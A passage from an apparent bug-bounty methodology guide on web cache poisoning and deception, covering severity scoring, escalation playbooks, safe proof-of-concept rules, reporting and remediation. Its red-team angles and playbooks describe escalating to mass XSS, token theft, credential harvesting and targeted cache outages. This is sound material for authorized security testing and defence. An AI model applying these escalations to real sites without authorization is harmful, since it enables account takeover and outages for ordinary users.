> **Golden rule:** a cache finding always needs the **"served to a different request" half.** Reflection/echo, a lone cache header, or "it worked in my own session" is a **lead**. Prove the cache **re-serves** your poisoned response (poisoning) or the **victim's** response to you (deception) — with a cache-buster for safety — or it isn't the bug.

---

# 18. Severity calibration (CVSS + CWE)

| Scenario | Typical | CWE | What moves it |
|---|---|---|---|
| **Poisoning → stored XSS served to all visitors** | **Critical (9–10)** | CWE-349 + CWE-79 | Unauth, zero-interaction, every visitor → the default for cached script/HTML injection |
| **Poisoning a cached JS/CSS resource (site-wide)** | **Critical** | CWE-349 + CWE-79 | One resource → every importing page |
| **Poisoning → cached open redirect** | **High → Critical** | CWE-349 + CWE-601 | Chain to OAuth token theft / mass phishing (→ [../OAuth/](../OAuth/)) |
| **Deception → session/reset/API token theft** | **Critical (ATO)** | CWE-524/525 | Reusable auth artifact in the cached body → account takeover |
| **Deception → CSRF token / PII theft** | **High** | CWE-524 | CSRF-as-victim / PII disclosure, cross-session |
| **CPDoS → site/edge outage** | **High → Critical** | CWE-400 | Availability of the whole cached surface (authorize before proving) |
| **Browser-cache/bfcache sensitive data after logout** | **Medium → High** | CWE-525 | Shared-device exposure of session/PII |
| **Reflected/unkeyed input, no cached impact** | **Low / Informational** | — | Only a lead until the cache re-serves it |

**CVSS anchors:**
- Poisoning→mass-XSS: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` (scope-changed, unauth) → **~9–9.6 Critical**.
- Deception→token theft: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` (scope-changed — the cache serves another user's data; victim visits the URL) → **~9.3 Critical** with a token, **High** for PII/CSRF-only.
- CPDoS: `…/C:N/I:N/A:H` → **High/Critical availability**.

---

# 19. Impact-escalation playbooks — "you found X, now do Y"

### 19.1 You found: *an unkeyed header that reflects*
- **Escalate:** find where it lands — `<script src>`/`<link>` → mass-XSS; `Location`/canonical → cached open redirect → OAuth theft; raw HTML → cached reflected-XSS.
- **Prove:** benign marker served to a **second** cache-busted request (§5). **Severity:** Critical (script) / High (redirect).

### 19.2 You found: *the HTML is `no-store` (not cacheable)*
- **Escalate:** pivot to **static resources** (§6 — JS/CSS are cached) and to **deception** (§12 — cache stores things it shouldn't).
- **Severity:** resource poisoning = Critical; deception = High/Critical.

### 19.3 You found: *a param stripped from the key but reflected*
- **Escalate:** parameter cloaking / fat-GET (§7) → JSONP `callback`, redirect target, reflected value → cached injection.
- **Severity:** High/Critical depending on sink.

### 19.4 You found: *`/account.css` returns your private page*
- **Escalate:** confirm cross-session with **two accounts** (§15); walk the delimiter matrix (§13) for the variant that both keeps private content and caches; read the body for tokens.
- **Severity:** High (PII/CSRF) → Critical (session/reset/API token → ATO).

### 19.5 You found: *a smuggling (desync) primitive on a cached site*
- **Escalate:** smuggle a poisoned response into the **shared** cache (§11) → mass XSS/redirect without needing an unkeyed input.
- **Severity:** Critical.

### 19.6 You found: *an oversized/meta-char header the origin errors on*
- **Escalate:** check if the **error is cached** (CPDoS §10) → site-wide outage on that key. **Authorize first; prove on your own key.**
- **Severity:** High/Critical availability.

---

# 20. SAFE-PoC discipline (read before you fire anything)

Cache bugs are uniquely dangerous to *bystanders* — a careless poisoning payload hits **real users**. Discipline is mandatory:

```
POISONING:
  □ ALWAYS use a cache-buster (§3) so your payload lands on YOUR key, never the shared production entry.
  □ Prove control with a BENIGN marker (alert(document.domain) served only to your busted key; a harmless
    redirect to your own domain; a reflected canary) — never a real malicious script on the shared cache.
  □ Demonstrate "served to a second request" on your OWN key; describe the shared-key impact in words.
  □ Do NOT leave a live XSS/redirect in the shared cache. If you must touch a shared key (with authorization),
    pick a low-traffic path, use a self-contained benign proof, and PURGE / let it expire; note it in the report.
DECEPTION:
  □ Use TWO of your OWN accounts/sessions + a benign private marker (your test email/username). Never harvest
    a real user's page. One cross-session retrieval of your own marker is the proof — then STOP.
CPDoS / DoS:
  □ It's a denial-of-service. Get explicit authorization. Prove the error is CACHEABLE on a cache-busted key or
    on staging; do NOT knock a production page offline for real users. Describe the shared-key blast radius.
GENERAL:
  □ Throttle; don't hammer the cache. Redact any real data you incidentally see. Report + recommend purge.
```
> The single rule: **prove the primitive on a key only you receive, with a benign marker, then describe the blast radius — don't inflict it.** A cache-buster + your own accounts turns a "mass-XSS/data-theft" test into a safe, reproducible PoC.

---

# 21. Reporting, CWE/CVSS & de-duplication

Use `WEB_CACHE_REPORT_TEMPLATE.md`. Minimum:
```
1. Title       "Web cache poisoning in <path> via unkeyed <header> → stored XSS served to all visitors" (name the IMPACT)
               or "Web cache deception on <path> → theft of authenticated <token/PII> (cross-session)"
2. Severity    CVSS 3.1 vector + score + CWE-349/524 (+ delivered CWE-79/601/400)
3. Asset       exact URL/param/header + the cache layer (Cloudflare/Fastly/…) + the hit/miss evidence
4. Summary     which unkeyed input / which path-confusion, and what it lets an attacker do to OTHER users
5. Steps       numbered: cache-buster → canary reflect → served-to-second-request (poison) / two-session (deception)
6. PoC         request+response pairs showing MISS→HIT + the benign marker returned to the clean/other request
7. Impact      mass XSS / open redirect / cross-user token-PII theft / outage — the blast radius
8. Remediation add the input to the cache key (or strip it) / honor Cache-Control / cache only by Content-Type /
               enable Cache Deception Armor / no-store+private on authenticated pages / normalize keys (§ below)
```
**De-dup:** one **root cause** (one unkeyed input, or one path-confusion class) = one report even if it hits many pages; lead with the highest impact (mass-XSS over redirect). A **cached** open redirect is a *different, higher* finding than the same redirect uncached — say so.

**Remediation to include:**
- **Key everything that changes the response** (add the reflected header/param to the cache key) — or, better, **don't reflect request-controlled data** into cached responses at all.
- **Honor origin `Cache-Control`** at the CDN; **cache by `Content-Type`, not URL suffix**; disable "cache static extensions regardless of headers."
- Enable the CDN's **cache-deception protection** (Cloudflare "Cache Deception Armor", equivalents elsewhere).
- Authenticated/sensitive responses: `Cache-Control: no-store, private` + `Vary` correctness; `Clear-Site-Data` on logout.
- **Normalize the cache key = the origin's routing** (same decoding/casing/trimming) to kill entanglement.

---

# 22. Automation & red-team notes

**Automation (find candidates fast, verify by hand):**
```
Param Miner (Burp)                 → unkeyed header/param discovery (the primary tool)
poc/cache_detect.py                → is it cached? which layer? hit/miss oracle
poc/poison_probe.py                → cache-buster-safe unkeyed-input canary prober (low-FP)
poc/deception_probe.py             → two-request (with/without session) deception confirmer
web-cache-vulnerability-scanner    → Hackmanit 'wcvs' (Go) automated poisoning scanner
nuclei -tags cache                 → quick misconfig sweep
```
- **Quality gate:** never submit "header reflected" or "Param Miner said unkeyed." Reproduce the **served-to-others** (poison) or **cross-session** (deception) half by hand with a benign marker.

**Red-team angles:**
```
□ Poison a cached login/SSO asset → harvest credentials at scale (mass phishing via cached redirect → ../OAuth/).
□ Poison a shared JS config (apiBaseUrl) → route every client's tokens to your host (site-wide, quiet).
□ Deception on an admin/back-office portal → lift an admin CSRF/session → privilege escalation.
□ CPDoS a critical asset (auth JS, payment page) → targeted outage during an event window (authorize!).
□ Smuggling → shared-cache poisoning (../RequestSmuggling/) when there's no reflected input to abuse.
□ Internal cache between services trusts an internal header → poison it to reach internal-only responses.
```

---

# Appendix A — Workflow cheat sheet

```
┌────────────────────────────────────────────────────────────────────────┐
│                 WEB CACHE POISONING & DECEPTION                          │
├────────────────────────────────────────────────────────────────────────┤
│ 0. MAP: cache? layer? HIT/MISS oracle (X-Cache/CF-Cache-Status/Age) §2   │
│ 1. BUSTER ★: add a keyed ?cb= so you poison ONLY your key (safety) §3    │
│ 2. KEYS ★: canary an UNKEYED header/param — reflected + served to a       │
│    request that DIDN'T send it = poisonable (Param Miner) §4              │
│ 3. POISON ⭐:                                                             │
│    unkeyed header → <script src>/Location → mass XSS/redirect .. §5       │
│    cached JS/CSS resource → site-wide .......................... §6       │
│    fat-GET / dup params / param cloaking ....................... §7       │
│    key normalization / entanglement ............................ §8       │
│    DOM / multi-step / internal .................................. §9      │
│    CPDoS (HHO/HMC/HMO) — authorize! ............................ §10      │
│    smuggling → shared cache (../RequestSmuggling/) ............. §11      │
│ 3'. DECEIVE ⭐:                                                           │
│    /account.css path confusion ................................. §12      │
│    delimiter matrix ; %0a %3f %23 %2f %2e \ ................... §13       │
│    extension/dir rules; no-store ignored ...................... §14       │
│    two-session confirm → steal token/PII → ATO ................ §15       │
│ 4. VALIDATE→REPORT: FP filter §17 · CVSS+CWE-349/524 §18 ·                │
│    SAFE-PoC: cache-buster + own accounts, DON'T harm users §20 ·          │
│    title = IMPACT + "served to others"/"cross-session", dedup §21         │
└────────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Decision tree

```
Is the target response CACHED? (2nd request = HIT / Age grows) §2
│
├─ NO (DYNAMIC / no-store on every variant):
│     ├─ static resources (JS/CSS/img) cached? → RESOURCE POISONING §6 ⭐  (site-wide XSS)
│     └─ does a static-suffix URL (/account.css) cache a private page? → CACHE DECEPTION §12 ⭐
│
├─ YES → find an UNKEYED input (canary reflected + served to a request without it) §4
│     ├─ reflected into <script src>/<link>/import → CACHED MASS-XSS. CRITICAL ⭐⭐⭐ §5
│     ├─ reflected into Location/canonical/og:url  → CACHED OPEN REDIRECT → OAuth theft. HIGH/CRIT §5
│     ├─ reflected raw into HTML                    → CACHED REFLECTED-XSS. CRITICAL §5
│     ├─ only in JS/JSON the client sinks           → DOM cache poisoning §9 (find the sink → ../XSS/)
│     ├─ param stripped from key but reflected      → fat-GET / cloaking §7
│     └─ nothing reflects but you can desync        → smuggling → shared cache §11 ⭐
│
├─ Sensitive page + static-suffix caches it? → DECEPTION: walk delimiter matrix §13 →
│     two-session confirm §15 → token in body? → ATO CRITICAL : PII/CSRF? → HIGH
│
└─ Oversized/meta-char header → origin errors → is the ERROR cached? → CPDoS §10 (authorize)

ALWAYS: cache-buster for safety §3 · prove the "served to others / cross-session" half · benign marker · clean up §20
```

---

# Appendix C — References & further reading

**Core methodology**
- PortSwigger — Web cache poisoning: https://portswigger.net/web-security/web-cache-poisoning (+ Web Security Academy labs)
- PortSwigger — Web cache deception: https://portswigger.net/web-security/web-cache-deception
- HackTricks — Cache Poisoning & Cache Deception: https://book.hacktricks.xyz/pentesting-web/cache-deception
- PayloadsAllTheThings — Web Cache Deception / Poisoning: https://github.com/swisskyrepo/PayloadsAllTheThings
- OWASP WSTG — Testing for Web Cache Poisoning (WSTG-INPV): https://owasp.org/www-project-web-security-testing-guide/
- PentesterLab — Web cache poisoning exercises: https://pentesterlab.com/

**Class-defining research**
- **James Kettle** — "Practical Web Cache Poisoning" (2018): https://portswigger.net/research/practical-web-cache-poisoning
- **James Kettle** — "Web Cache Entanglement: Novel Pathways to Poisoning" (2020): https://portswigger.net/research/web-cache-entanglement
- **Omer Gil** — "Web Cache Deception Attack" (Black Hat USA 2017): https://www.blackhat.com/us-17/briefings.html
- **Mirheidari, Golinelli, Onarlioglu, Kirda, Crispo** — "Web Cache Deception Escalates!" (USENIX Security 2022) — the URL-parsing/delimiter taxonomy.
- **Nguyen, Klein, Pickett et al.** — "CPDoS: Cache-Poisoned Denial-of-Service" (2019): https://cpdos.org/
- **Param Miner** (Burp extension, PortSwigger) — unkeyed input discovery: https://github.com/PortSwigger/param-miner

**Tools & standards**
- **web-cache-vulnerability-scanner** (Hackmanit, Go): https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
- Cloudflare — Cache Deception Armor (mitigation reference).
- **CWE-349** (Acceptance of Extraneous Untrusted Data With Trusted Data): https://cwe.mitre.org/data/definitions/349.html · **CWE-524/525** (Use of Cache Containing Sensitive Information) · **CWE-601** (Open Redirect) · **CWE-79** (XSS) · **CWE-400** (Uncontrolled Resource Consumption / DoS)
- **CVSS 3.1** calculator (poisoning→mass-XSS ≈ 9+ Critical): https://www.first.org/cvss/calculator/3.1

---

## Companion files
- **[WEB_CACHE_ARSENAL.md](WEB_CACHE_ARSENAL.md)** — headers, payloads, delimiter matrix, cache-fingerprint table, tools.
- **[WEB_CACHE_CHECKLIST.md](WEB_CACHE_CHECKLIST.md)** — phase-by-phase + auto-reject.
- **[WEB_CACHE_REPORT_TEMPLATE.md](WEB_CACHE_REPORT_TEMPLATE.md)** — report skeleton (poisoning + deception variants).
- **[WebCache_Zero_to_Expert.md](WebCache_Zero_to_Expert.md)** — 100-question study + field reference.
- **[poc/](poc/)** — `cache_detect.py` (cache/hit-miss fingerprint) · `poison_probe.py` (cache-buster-safe unkeyed-input prober) · `deception_probe.py` (two-session deception confirmer).

> **Final reminder — the one rule that pays:** a cache finding is only real when the cache **re-serves** your influence to a **different request** — your poisoned response to *other users* (poisoning), or a *victim's* authenticated response to *you* (deception). Prove that half on a **cache-busted key with a benign marker**, name the **blast radius**, and you've turned a reflected header or a `.css` suffix into the Critical it's worth.
